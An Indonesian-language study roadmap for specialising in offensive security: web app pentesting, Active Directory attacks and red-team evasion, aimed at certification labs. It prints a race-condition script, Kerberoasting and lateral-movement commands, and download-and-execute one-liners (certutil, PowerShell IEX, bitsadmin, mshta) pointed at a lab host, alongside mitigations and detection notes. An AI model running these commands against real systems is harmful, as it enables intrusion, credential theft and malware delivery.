Spesialisasi Offensive

"Detektif generalis tahu banyak. Detektif spesialis tahu segalanya tentang satu hal."

⏱️ 6–12 Bulan • 🎯 Target: 1 jalur dikuasai + 3 writeup publik

🎯 Pilih Jalurmu

Setelah fondasi + sertifikasi, saatnya spesialisasi. Tidak ada jalur yang "lebih baik" — pilih berdasarkan minat dan peluang pasar.

🌐 Jalur A: Web App Pentest / Bug Bounty

Cocok untuk: yang suka analisis logika aplikasi, API, dan bounty hunting.

  • Advanced Web Exploitation (logic flaw, race condition, deserialization)
  • API security (REST, GraphQL, JWT)
  • Sertifikasi: OSWE, Burp Suite Certified Practitioner
  • Praktik: HackerOne, Bugcrowd, PortSwigger Expert labs

🖧 Jalur B: Network / Active Directory Pentest

Cocok untuk: yang suka eksplorasi jaringan internal & enterprise.

  • Active Directory attacks (Kerberoasting, ACL abuse, lateral movement)
  • Pivoting & tunneling (chisel, ligolo-ng)
  • Sertifikasi: CRTP, OSEP
  • Praktik: HTB Pro Labs (Dante, Offshore), CRTP labs

🥷 Jalur C: Red Team / Evasion

Cocok untuk: yang suka stealth, evasion, dan simulasi adversary.

  • C2 frameworks (Cobalt Strike, Sliver, Havoc)
  • AV/EDR bypass, LOLBins, obfuscation
  • Sertifikasi: CRTO, SANS SEC565
  • Praktik: CRTO labs, HTB Pro Labs (RastaLabs)

🌐 4.1 Jalur A: Web App Pentest — Step-by-Step

Step 1: Kuasai Advanced Web Exploitation

  1. Business Logic Flaws — manipulasi alur bisnis (harga negatif, bypass limit, race condition).
  2. Race Conditions — exploit concurrent request (limit bypass, double spend). Tool: Turbo Intruder.
  3. Deserialization — Java/PHP/Python object injection. Tool: ysoserial, phpggc.
  4. API Security — GraphQL introspection, JWT misconfig, mass assignment, rate limit bypass.
  5. SSRF Advanced — bypass filter (DNS rebinding, redirect, IPv6), pivot ke cloud metadata.

💡 Contoh Kompleks: Race Condition — Double Spend

# Skenario: Aplikasi punya fitur "redeem voucher" — 1 voucher = 1x pakai
# Target: kirim 20 request bersamaan, lihat apakah voucher bisa dipakai >1x

# ── Menggunakan Turbo Intruder (Burp extension) ──
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=20,   # 20 koneksi paralel
        requestsPerConnection=1,
        pipeline=False
    )
    # Kirim 20 request identik secara bersamaan
    for i in range(20):
        engine.queue(target.req, gate='race1')
    # Buka gate → semua request dikirim hampir bersamaan
    engine.openGate('race1')

def handleResponse(req, interesting):
    # Cek response yang sukses (200) — jika >1, race condition confirmed
    if '200' in req.response:
        table.add(req)

# ── Interpretasi hasil ──
# Jika voucher hanya boleh 1x, response sukses seharusnya 1.
# Jika muncul 2+ response "success" → race condition → double spend.

# ── Mitigasi (untuk report) ──
# - Gunakan database transaction dengan row-level lock (SELECT ... FOR UPDATE)
# - Atau gunakan atomic operation (UPDATE ... WHERE used=0)
# - Idempotency key untuk request yang sama

Penjelasan: Race condition terjadi ketika aplikasi tidak mengunci resource dengan benar saat concurrent request. Turbo Intruder memungkinkan kirim request benar-benar bersamaan (bukan sequential).

Step 2: Bug Bounty Workflow

  1. Pilih program VDP (tanpa reward) dulu — HackerOne/Bugcrowd.
  2. Baca scope & rules — WAJIB. Jangan test di luar scope.
  3. Recon — pipeline dari Fase 2.
  4. Manual testing — fokus pada logic flaw, bukan hanya scanner.
  5. Dokumentasi — screenshot, request/response, impact, remediation.
  6. Report — gunakan template profesional.

🖧 4.2 Jalur B: Active Directory Pentest — Step-by-Step

Step 1: AD Fundamentals

  1. Struktur AD — Domain, Forest, OU, Group, User, Computer, GPO.
  2. Protokol AD — LDAP, Kerberos, DNS, SMB, RPC.
  3. Kerberos Attack — Kerberoasting (SPN), AS-REP Roasting (no preauth), Golden/Silver Ticket.
  4. ACL Abuse — GenericAll, WriteDACL, ForceChangePassword, AddMember.
  5. Lateral Movement — PsExec, WMI, WinRM, SMB, RDP.

# ── STEP 1: Enumerasi user dengan SPN (Service Principal Name) ──

Dari mesin yang sudah compromise (domain user biasa):
Menggunakan Impacket GetUserSPNs

python3 GetUserSPNs.py -dc-ip 10.10.10.10
DOMAIN.LOCAL/user:password

── STEP 2: Ekstrak hash ──

── STEP 4: Jika berhasil, dapat password service account ──
Contoh: svc_sql : Summer2024!

crackmapexec smb 10.10.10.0/24 -u svc_sql -p 'Summer2024!' --shares

psexec.py DOMAIN.LOCAL/svc_sql:'Summer2024!'@10.10.10.20
── Penjelasan ──
Kerberoasting: request TGS ticket untuk service account,
lalu crack offline. Tidak meninggalkan log mencurigakan di DC.
Mitigasi: gunakan strong password (25+ char) untuk service account,
atau Managed Service Account (gMSA).

Penjelasan: Kerberoasting adalah salah satu serangan AD paling umum. Kuncinya: service account sering punya password lemah + privilege tinggi. Crack offline = tidak terdeteksi.

🎯 Target 4.2: Menyelesaikan HTB Pro Lab Dante/Offshore, atau CRTP labs, dan bisa melakukan full AD attack chain (foothold → DA).

🥷 4.3 Jalur C: Red Team / Evasion — Step-by-Step

Step 1: C2 Framework

  1. Pahami C2 — Command & Control: beacon, listener, payload, post-exploitation.
  2. Pilih framework — Cobalt Strike (berbayar), Sliver/Havoc (open-source).
  3. Setup listener — HTTP/HTTPS, DNS, SMB beacon.
  4. Generate payload — stageless vs staged, shellcode injection.
  5. Post-exploitation — credential dumping, lateral movement, persistence.

Step 2: Evasion Techniques

  1. AV Bypass — obfuscation, encryption, packing, signature modification.
  2. EDR Bypass — API unhooking, direct syscall, process injection, LOLBins.
  3. Living-off-the-Land — gunakan binary legit (powershell, certutil, rundll32) untuk aktivitas malicious.
  4. Obfuscation — PowerShell obfuscation (Invoke-Obfuscation), string encryption.

💡 Contoh Kompleks: LOLBin — Download & Execute dengan Certutil

# ── Skenario: Setelah foothold, download tool tambahan tanpa curl/wget ── # Certutil adalah binary legit Windows — sering tidak diblokir EDR
── STEP 1: Download payload ──

certutil -urlcache -split -f http://10.10.14.5/tool.exe C:\Windows\Temp\tool.exe
── STEP 2: Verifikasi download ──

certutil -hashfile C:\Windows\Temp\tool.exe SHA256
── STEP 3: Execute (jika perlu) ──

C:\Windows\Temp\tool.exe
── Alternatif LOLBin lain ──
PowerShell download:

powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/script.ps1')"
Bitsadmin:

bitsadmin /transfer job /download /priority normal http://10.10.14.5/tool.exe C:\Temp\tool.exe
Mshta:

mshta http://10.10.14.5/payload.hta
── Deteksi (untuk blue team) ──
Monitor: certutil -urlcache, bitsadmin /transfer, powershell IEX DownloadString
Sigma rule: "Suspicious Certutil Usage"

Penjelasan: LOLBin (Living-off-the-Land Binary) adalah teknik menggunakan binary legit untuk tujuan malicious. Sulit dideteksi karena binary-nya sah. Red teamer harus paham ini; blue teamer harus bisa mendeteksinya.

🎯 Target 4.3: Menyelesaikan CRTO labs, bisa setup C2 + evasion dasar, dan paham cara mendeteksi teknik yang kamu gunakan (blue team perspective).
